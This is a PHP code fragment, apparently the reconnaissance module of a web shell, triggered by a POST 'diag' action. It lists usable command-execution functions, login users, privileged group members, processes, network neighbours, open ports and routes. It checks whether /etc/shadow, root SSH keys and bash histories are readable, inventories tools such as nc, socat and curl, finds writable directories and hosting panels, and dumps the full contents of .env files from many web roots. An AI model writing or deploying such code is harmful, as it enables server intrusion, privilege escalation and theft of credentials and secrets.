if (isset($_POST['action']) && $_POST['action'] === 'diag') {
ob_end_clean();
header('Content-Type: application/json');

// --- PHP / server basics ---
$dangerous = ['exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec','mail','putenv','imap_open','dl','ffi','error_log','mb_send_mail'];
$funcs = [];
foreach ($dangerous as $f) $funcs[$f] = function_exists($f);
$exts = ['FFI','imap','sockets','posix','pcntl','openssl','sqlite3','phar','zip'];
$extList = [];
foreach ($exts as $e) $extList[$e] = extension_loaded($e);

// --- Current process identity ---
$uid = function_exists('posix_getuid') ? posix_getuid() : null;
$gid = function_exists('posix_getgid') ? posix_getgid() : null;
$pwent = function_exists('posix_getpwuid') ? @posix_getpwuid($uid) : false;
$grent = function_exists('posix_getgrgid') ? @posix_getgrgid($gid) : false;
$groups = function_exists('posix_getgroups') ? (@posix_getgroups() ?: []) : [];
$groupNames = [];
foreach ($groups as $g) {
$gi = function_exists('posix_getgrgid') ? @posix_getgrgid($g) : false;
if ($gi) $groupNames[] = $gi['name'] . '(' . $g . ')';
}

// --- /etc/passwd users with login shells ---
$passwdUsers = [];
$passwdRaw = @file_get_contents('/etc/passwd') ?: '';
foreach (explode("\n", $passwdRaw) as $line) {
$p = explode(':', $line);
if (count($p) >= 7 && !in_array($p[6], ['/usr/sbin/nologin','/bin/false','/sbin/nologin',''])) {
$passwdUsers[] = ['user'=>$p[0],'uid'=>$p[2],'gid'=>$p[3],'home'=>$p[5],'shell'=>$p[6]];
}
}

// --- /etc/group membership ---
$groupsRaw = @file_get_contents('/etc/group') ?: '';
$interestingGroups = ['sudo','wheel','lxd','docker','adm','shadow','disk'];
$groupMemberships = [];
foreach (explode("\n", $groupsRaw) as $line) {
$p = explode(':', $line);
if (count($p) >= 4 && in_array($p[0], $interestingGroups) && trim($p[3]) !== '') {
$groupMemberships[$p[0]] = array_filter(explode(',', $p[3]));
}
}

// --- Running processes ---
$processes = [];
foreach (@glob('/proc/[0-9]*') ?: [] as $pidDir) {
$cmd = @file_get_contents($pidDir . '/cmdline');
$stat = @file_get_contents($pidDir . '/status');
if (!$cmd) continue;
$cmd = str_replace("\0", ' ', trim($cmd));
$uid_proc = null;
if (preg_match('/^Uid:\s+(\d+)/m', $stat, $m)) $uid_proc = (int)$m[1];
$processes[] = ['pid' => basename($pidDir), 'uid' => $uid_proc, 'cmd' => substr($cmd, 0, 120)];
}

// --- Container detection ---
$container = ['detected' => false, 'type' => null, 'hints' => []];
if (@file_exists('/.dockerenv')) {
$container = ['detected' => true, 'type' => 'docker', 'hints' => ['/.dockerenv exists']];
} elseif (@file_exists('/run/.containerenv')) {
$container = ['detected' => true, 'type' => 'podman', 'hints' => ['/run/.containerenv exists']];
} else {
$cgroup = @file_get_contents('/proc/1/cgroup') ?: '';
if (preg_match('/(docker|kubepods|containerd|lxc|ecs)/', $cgroup, $cm)) {
$container = ['detected' => true, 'type' => $cm[1], 'hints' => ['cgroup: ' . $cm[1]]];
}
$sched = @file_get_contents('/proc/1/sched');
if ($sched && !preg_match('/^\s*(init|systemd)\s/m', $sched)) {
$container['hints'][] = 'PID 1 is not init/systemd';
$container['detected'] = true;
}
}

// --- Network: ARP table ---
$arpRaw = @file_get_contents('/proc/net/arp') ?: '';
$arpHosts = [];
foreach (array_slice(explode("\n", $arpRaw), 1) as $line) {
$parts = preg_split('/\s+/', trim($line));
if (count($parts) >= 4 && $parts[0] !== '') {
$arpHosts[] = ['ip'=>$parts[0], 'mac'=>$parts[3], 'dev'=>$parts[5] ?? ''];
}
}

// --- Network: open ports (TCP) ---
$openPorts = [];
foreach (['/proc/net/tcp', '/proc/net/tcp6'] as $tcpFile) {
$tcpRaw = @file_get_contents($tcpFile) ?: '';
foreach (array_slice(explode("\n", $tcpRaw), 1) as $line) {
$parts = preg_split('/\s+/', trim($line));
if (count($parts) >= 4 && $parts[3] === '0A') {
$hex = explode(':', $parts[1]);
if (isset($hex[1])) {
$port = hexdec($hex[1]);
if (!in_array($port, $openPorts)) $openPorts[] = $port;
}
}
}
}
sort($openPorts);

// --- Network: routing table ---
$routeRaw = @file_get_contents('/proc/net/route') ?: '';
$routes = [];
foreach (array_slice(explode("\n", $routeRaw), 1) as $line) {
$p = preg_split('/\s+/', trim($line));
if (count($p) >= 4 && $p[1] !== '') {
$dest = long2ip(hexdec(strrev(hex2bin(str_pad($p[1],8,'0',STR_PAD_LEFT)))));
$gw = long2ip(hexdec(strrev(hex2bin(str_pad($p[2],8,'0',STR_PAD_LEFT)))));
$mask = long2ip(hexdec(strrev(hex2bin(str_pad($p[7],8,'0',STR_PAD_LEFT)))));
$routes[] = ['iface'=>$p[0],'dest'=>$dest,'gw'=>$gw,'mask'=>$mask];
}
}

// --- Interesting readable files ---
$sensitiveFiles = [
'/etc/passwd', '/etc/shadow', '/etc/sudoers',
'/root/.ssh/id_rsa', '/root/.ssh/authorized_keys', '/root/.bash_history',
'/home/*/.ssh/id_rsa', '/home/*/.bash_history',
'/.env', getcwd() . '/.env', getcwd() . '/../.env',
];
$readable = [];
foreach ($sensitiveFiles as $pattern) {
foreach (@glob($pattern) ?: [$pattern] as $f) {
if (@is_readable($f)) $readable[] = $f;
}
}

// --- Binary directories ---
$binDirs = [];
foreach (['/bin','/sbin','/usr/bin','/usr/sbin','/usr/local/bin','/usr/local/sbin','/usr/lib','/usr/libexec','/snap/bin'] as $d) {
if (@is_dir($d)) $binDirs[] = ['path' => $d, 'readable' => @is_readable($d), 'writable' => @is_writable($d)];
}

// --- Writable directories ---
$writableDirs = [];
foreach (['/tmp','/var/tmp','/dev/shm','/run/shm',getcwd(),'/var/www','/www/wwwroot'] as $d) {
if (@is_writable($d)) $writableDirs[] = $d;
}

// --- Scan all binaries from bin dirs, then classify ---
$knownInterpreters = ['python3','python','perl','ruby','php','bash','sh','node','lua','tclsh'];
$knownTools = ['nc','ncat','curl','wget','gcc','cc','make','git','nmap','socat','ssh','scp','rsync','tar','zip','unzip'];
$allBinaries = [];
$availInterpreters = [];
$availTools = [];
foreach ($binDirs as $info) {
if (!$info['readable']) continue;
foreach (@scandir($info['path']) ?: [] as $entry) {
if ($entry === '.' || $entry === '..') continue;
$full = $info['path'] . '/' . $entry;
if (!@is_file($full)) continue;
$allBinaries[] = $full;
if (in_array($entry, $knownInterpreters)) $availInterpreters[] = $full;
if (in_array($entry, $knownTools)) $availTools[] = $full;
}
}

// --- Installed panel / hosting ---
$panels = [
'cPanel' => '/usr/local/cpanel',
'Plesk' => '/usr/local/psa',
'DirectAdmin' => '/usr/local/directadmin',
'HestiaCP' => '/usr/local/hestia',
'VestaCP' => '/usr/local/vesta',
'ISPConfig' => '/usr/local/ispconfig',
'CyberPanel' => '/usr/local/CyberPanel',
'CloudPanel' => '/home/clp',
'Webmin' => '/usr/share/webmin',
'Virtualmin' => '/usr/share/webmin/virtual-server',
'Froxlor' => '/var/www/froxlor',
'KeyHelp' => '/home/keyhelp',
'AMPPS' => '/usr/local/ampps',
'Zend Server' => '/usr/local/zend',
'GridPane' => '/opt/gridpane',
'Moss' => '/opt/moss',
'RunCloud' => '/etc/runcloud',
'ServerPilot' => '/etc/serverpilot',
'Laravel Forge' => '/etc/forge',
];
$detectedPanels = [];
// BT Panel / aaPanel share the same path
if (@file_exists('/www/server/panel')) {
$btConf = @file_get_contents('/www/server/panel/config/config.json') ?: '';
$detectedPanels[] = (strpos($btConf, '"language":"en"') !== false || @file_exists('/www/server/panel/BTPanel/static/language/en.json'))
? 'aaPanel (/www/server/panel)'
: 'BT Panel (/www/server/panel)';
}
foreach ($panels as $name => $path) {
if (@file_exists($path)) $detectedPanels[] = $name . ' (' . $path . ')';
}

// --- .env file contents ---
$envContents = [];
$cwd = getcwd() ?: '';
$docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
$envPaths = array_unique(array_filter([
$cwd . '/.env',
$cwd . '/../.env',
$docRoot . '/.env',
$docRoot . '/../.env',
'/var/www/.env',
'/var/www/html/.env',
'/var/www/html/../.env',
'/home/*/public_html/.env',
'/home/*/htdocs/.env',
'/www/wwwroot/*/.env',
'/srv/www/*/.env',
'/opt/*/shared/.env',
]));
$envSearch = [];
foreach ($envPaths as $pattern) {
foreach (@glob($pattern) ?: [$pattern] as $f) {
$envSearch[] = $f;
}
}
foreach (array_unique($envSearch) as $ef) {
$content = @file_get_contents($ef);
if ($content) $envContents[$ef] = $content;
}

echo json_encode([
'php_version' => phpversion(),
'os' => php_uname(),
'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
'disable_functions' => ini_get('disable_functions') ?: 'none',
'open_basedir' => ini_get('open_basedir') ?: 'none',
'allow_url_fopen' => ini_get('allow_url_fopen'),
'sendmail_path' => ini_get('sendmail_path') ?: 'none',
'user' => get_current_user(),
'uid' => $uid,
'gid' => $gid,
'user_name' => $pwent['name'] ?? '?',
'group_name' => $grent['name'] ?? '?',
'groups' => implode(', ', $groupNames),
'cwd' => getcwd() ?: '?',
'disk_free' => @disk_free_space('.') ?: 0,
'disk_total' => @disk_total_space('.') ?: 0,
'functions' => $funcs,
'extensions' => $extList,
'passwd_users' => $passwdUsers,
'group_memberships' => $groupMemberships,
'processes' => $processes,
'container' => $container,
'arp_hosts' => $arpHosts,
'open_ports' => $openPorts,
'routes' => $routes,
'readable_files' => $readable,
'bin_dirs' => $binDirs,
'writable_dirs' => $writableDirs,
'all_binaries' => $allBinaries,
'interpreters' => $availInterpreters,
'tools' => $availTools,
'panels' => $detectedPanels,
'env_files' => $envContents,
]);
exit;
}
